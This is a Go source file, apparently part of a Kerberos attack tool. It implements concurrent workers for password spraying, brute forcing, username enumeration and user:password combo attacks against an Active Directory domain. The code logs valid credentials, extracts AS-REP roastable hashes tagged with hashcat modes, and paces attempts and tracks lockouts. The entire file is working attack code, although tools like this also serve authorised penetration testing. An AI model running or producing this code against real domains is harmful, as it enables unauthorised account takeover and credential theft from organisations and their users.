package cmd

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func makeSprayWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup, password string, userAsPass bool) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case username, ok := <-usernames:
			if !ok {
				return
			}
			if userAsPass {
				testLogin(ctx, username, username)
			} else {
				testLogin(ctx, username, password)
			}
		}
	}
}

func makeBruteWorker(ctx context.Context, passwords <-chan string, wg *sync.WaitGroup, username string) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case password, ok := <-passwords:
			if !ok {
				return
			}
			testLogin(ctx, username, password)
		}
	}
}

func makeEnumWorker(ctx context.Context, usernames <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case username, ok := <-usernames:
			if !ok {
				return
			}
			testUsername(ctx, username)
		}
	}
}

func makeBruteComboWorker(ctx context.Context, combos <-chan [2]string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case combo, ok := <-combos:
			if !ok {
				return
			}
			testLogin(ctx, combo[0], combo[1])
		}
	}
}

func testLogin(ctx context.Context, username string, password string) {
	atomic.AddInt32(&counter, 1)
	login := fmt.Sprintf("%v@%v:%v", username, domain, password)
	userFull := fmt.Sprintf("%v@%v", username, domain)

	adaptiveWait := getAdaptiveDelay()
	if adaptiveWait > 0 {
		time.Sleep(adaptiveWait)
	}

	if ok, err := kSession.TestLogin(username, password); ok {
		atomic.AddInt32(&successes, 1)
		writeValidUser(username)
		markTested(userFull)
		recordSuccess()
		if err != nil {
			logger.Log.Noticef("[+] VALID LOGIN WITH ERROR:\t %s\t (%s)", login, err)
			emitJSON("valid_login", userFull, password, err.Error(), "", 0, 0)
		} else {
			logger.Log.Noticef("[+] VALID LOGIN:\t %s", login)
			emitJSON("valid_login", userFull, password, "", "", 0, 0)
		}
		if stopOnSuccess {
			cancel()
		}
	} else {
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", login, errorString)
			emitJSON("error", userFull, "", errorString, "", 0, 0)
			cancel()
		} else {
			if strings.Contains(errorString, "LOCKED OUT") {
				recordLockout()
				emitJSON("lockout", userFull, "", errorString, "", 0, 0)
			}
			logger.Log.Debugf("[!] %v - %v", login, errorString)
		}
		markTested(userFull)
	}
}

func testUsername(ctx context.Context, username string) {
	atomic.AddInt32(&counter, 1)
	usernamefull := fmt.Sprintf("%v@%v", username, domain)

	adaptiveWait := getAdaptiveDelay()
	if adaptiveWait > 0 {
		time.Sleep(adaptiveWait)
	}

	valid, hash, etype, err := kSession.TestUsername(username)
	if valid {
		atomic.AddInt32(&successes, 1)
		writeValidUser(username)
		markTested(usernamefull)
		recordSuccess()
		if err != nil {
			logger.Log.Noticef("[+] VALID USERNAME WITH ERROR:\t %s\t (%s)", username, err)
			emitJSON("valid_username", usernamefull, "", err.Error(), "", 0, 0)
		} else if hash != "" {
			hmode := 0
			switch etype {
			case 23: hmode = 18200
			case 17: hmode = 19600
			case 18: hmode = 19700
			}
			emitJSON("asrep_roastable", usernamefull, "", "", hash, hmode, etype)
		} else {
			logger.Log.Noticef("[+] VALID USERNAME:\t %s", usernamefull)
			emitJSON("valid_username", usernamefull, "", "", "", 0, 0)
		}

	} else if err != nil {
		ok, errorString := kSession.HandleKerbError(err)
		if !ok {
			logger.Log.Errorf("[!] %v - %v", usernamefull, errorString)
			emitJSON("error", usernamefull, "", errorString, "", 0, 0)
			cancel()
		} else {
			if strings.Contains(errorString, "LOCKED OUT") {
				recordLockout()
				emitJSON("lockout", usernamefull, "", errorString, "", 0, 0)
			}
			logger.Log.Debugf("[!] %v - %v", usernamefull, errorString)
		}
		markTested(usernamefull)
	} else {
		logger.Log.Debugf("[!] Unknown behavior - %v", usernamefull)
		markTested(usernamefull)
	}
}
